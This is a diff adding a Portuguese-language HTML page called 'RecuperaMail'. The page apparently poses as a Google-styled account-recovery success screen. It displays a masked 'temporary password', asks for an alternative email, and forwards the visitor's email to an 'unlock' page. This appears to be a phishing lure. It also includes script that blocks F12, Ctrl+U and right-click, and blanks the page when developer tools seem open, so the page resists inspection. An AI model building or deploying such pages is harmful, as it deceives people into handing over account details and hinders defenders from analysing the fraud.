@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RecuperaMail - Recuperado</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .popup-container {
+      border: 1px solid #ccc;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    @media (min-width: 768px) {
+      .popup-container {
+        width: 30%; /* ajuste a largura do container no desktop aqui */
+        max-width: 350px;
+      }
+    }
+
+    .popup-container img {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+
+    .titulo {
+      color: #4285F4;
+      font-size: 24px;
+      font-weight: 700;
+      line-height: 27px;
+      margin-bottom: 15px;
+    }
+
+    .subtitulo {
+      font-size: 20px;
+      font-weight: 500;
+      line-height: 23px;
+      color: #202124;
+      margin-bottom: 15px;
+    }
+
+    .info {
+      font-size: 16px;
+      line-height: 22px;
+      margin: 5px 0;
+    }
+
+    .label {
+      color: #202124;
+      font-weight: 300;
+    }
+
+    .senha {
+      color: #34a853;
+      font-weight: 400;
+    }
+
+    .codigo {
+      color: #ea4335;
+      font-weight: 400;
+    }
+
+    .mensagem {
+      font-size: 14px;
+      font-weight: 300;
+      line-height: 20px;
+      color: #5F6368;
+      margin: 20px 0 10px;
+    }
+
+    #emailForm {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: 400px;
+      margin: auto;
+    }
+
+    #email {
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 15px;
+      transition: border 0.3s ease, box-shadow 0.3s ease;
+      outline: none;
+    }
+
+    #email:focus {
+      border: 1px solid #0073e6;
+      box-shadow: 0 0 5px rgba(0, 115, 230, 0.3);
+    }
+
+    #submitBtn {
+      width: 100%;
+      padding: 12px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-family: Arial;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    #submitBtn:hover {
+      background-color: #005bb5;
+    }
+
+    .links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 20px;
+      font-size: 12px;
+      font-weight: 300;
+    }
+
+    .links a {
+      color: #4285F4;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="popup-container">
+    <img src="logo.png" alt="Ícone">
+    <div class="titulo">Recuperação de Conta</div>
+    <div class="subtitulo" id="subtitulo">Seu e-mail foi recuperado com sucesso!</div>
+
+    <div class="info">
+      <span class="label">Senha temporária:</span>
+      <span class="senha">B9****2f</span>
+    </div>
+    <div class="info">
+      <span class="label">Código de autenticação:</span>
+      <span class="codigo">T****6</span>
+    </div>
+
+    <div class="mensagem">Se deseja continuar com a recuperação, por favor, forneça um e-mail alternativo abaixo</div>
+
+    <form id="emailForm">
+      <input type="email" id="email" name="email" placeholder="Digite o e-mail alternativo" required>
+      <button id="submitBtn" type="submit">Enviar</button>
+    </form>
+
+    <div class="links">
+      <a href="../politicas" target="_blank">Política de Privacidade</a>
+      <a href="../termos" target="_blank'">Termos de Uso</a>
+    </div>
+  </div>
+
+  <script>
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    // Atualiza o subtítulo com o e-mail da URL, se houver
+    const emailParam = getQueryParam("data");
+    if (emailParam) {
+      document.getElementById("subtitulo").innerText = `Seu e-mail ${emailParam} foi recuperado com sucesso!`;
+    }
+
+    document.getElementById("emailForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const email = getQueryParam("data");
+      if (email) {
+        window.location.href = "../desbloquear/?email=" + encodeURIComponent(email);
+      }
+    });
+  </script>
+
+  <script>
+document.addEventListener('keydown', function (event) {
+    if (event.key === 'F12' || (event.ctrlKey && event.key === 'u')) {
+        event.preventDefault();
+    }
+});
+
+document.addEventListener('contextmenu', function (event) {
+    event.preventDefault();
+});
+
+// Função para detectar se DevTools está aberto
+function isDevToolsOpen() {
+    let threshold = 160; // O Chrome altera a diferença entre `outerHeight` e `innerHeight`
+    return (window.outerHeight - window.innerHeight > threshold) || (window.outerWidth - window.innerWidth > threshold);
+}
+
+// Função para detectar modo responsivo
+function detectResponsiveMode() {
+    let isSmallScreen = window.innerWidth < 800 || window.innerHeight < 800;
+    
+    if (isSmallScreen && isDevToolsOpen()) {
+        window.location.href = 'about:blank';
+    }
+}
+
+// Verificar no carregamento
+window.addEventListener('load', detectResponsiveMode);
+
+// Monitorar mudanças na tela e no DevTools
+setInterval(detectResponsiveMode, 1000);
+</script>
+  
+</body>
+</html>
